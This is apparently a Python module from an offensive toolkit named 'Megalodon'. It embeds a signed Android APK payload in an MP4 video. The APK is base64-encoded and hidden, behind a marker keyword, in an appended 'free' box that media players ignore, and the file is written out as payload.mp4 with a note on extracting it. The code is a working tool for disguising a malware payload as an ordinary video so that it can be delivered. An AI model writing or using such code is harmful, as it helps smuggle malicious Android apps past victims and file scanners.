import os
import json
import base64
from pathlib import Path

MP4_FTYP = b'ftyp'
MP4_HEADER_SIZE = 8


class VideoPayload:

    def __init__(self):
        self.output_dir = Path(__file__).parent.parent.parent / 'payloads' / 'videos'
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.target_apk = None
        self.cover_video = None

    def load_config(self):
        cfg = Path('config/megalodon.json')
        if cfg.exists():
            return json.loads(cfg.read_text())
        return {}

    def select_apk(self, apk_path=None):
        if apk_path:
            p = Path(apk_path).expanduser()
            if p.exists() and p.suffix == '.apk':
                self.target_apk = p
                return True
            return False

        default = Path(__file__).parent.parent.parent / 'payloads' / 'android' / 'build' / 'megalodon_signed.apk'
        if default.exists():
            self.target_apk = default
            return True
        return False

    def select_cover_video(self, video_path=None):
        if video_path:
            p = Path(video_path).expanduser()
            if p.exists():
                self.cover_video = p
                return True
            return False

        for candidate in ['cover.mp4', 'movie.mp4', 'video.mp4']:
            p = self.output_dir / candidate
            if p.exists():
                self.cover_video = p
                return True

        return False

    def embed_in_mp4(self, cover_path, apk_path, out_path):
        video = cover_path.read_bytes()
        apk = apk_path.read_bytes()

        if MP4_FTYP not in video[:32]:
            raise ValueError('Cover is not a valid MP4')

        payload_b64 = base64.b64encode(apk)

        # Build a 'free' box (safe to ignore by MP4 players)
        # Structure: size(4) + 'free'(4) + data
        keyword = b'MEGALODON_APK:'
        data = keyword + payload_b64
        box = (len(data) + 8).to_bytes(4, 'big') + b'free' + data

        new_data = video + box
        out_path.write_bytes(new_data)
        return out_path
    def generate(self, apk_path=None, video_path=None):
        if not self.select_apk(apk_path):
            return {'success': False, 'error': 'APK not found. Run payload build-apk + compile-apk first.'}
        if not self.select_cover_video(video_path):
            return {'success': False, 'error': 'Cover video not found. Provide a real .mp4'}

        out = self.output_dir / f'payload{self.cover_video.suffix}'

        try:
            self.embed_in_mp4(self.cover_video, self.target_apk, out)
        except Exception as e:
            return {'success': False, 'error': str(e)}

        size = out.stat().st_size
        print(f'[+] Video payload created: {out}')
        print(f'[+] Cover: {self.cover_video.name}')
        print(f'[+] Embedded APK: {self.target_apk.name}')
        print(f'[+] Output size: {size / 1024:.1f} KB')

        return {
            'success': True,
            'payload_file': str(out),
            'cover': str(self.cover_video),
            'apk': str(self.target_apk),
            'size_kb': round(size / 1024, 1),
            'type': 'video',
            'note': 'APK is appended to the MP4. Extract with: extract payload <file>'
        }


def generate(apk_path=None, video_path=None):
    gen = VideoPayload()
    return gen.generate(apk_path, video_path)
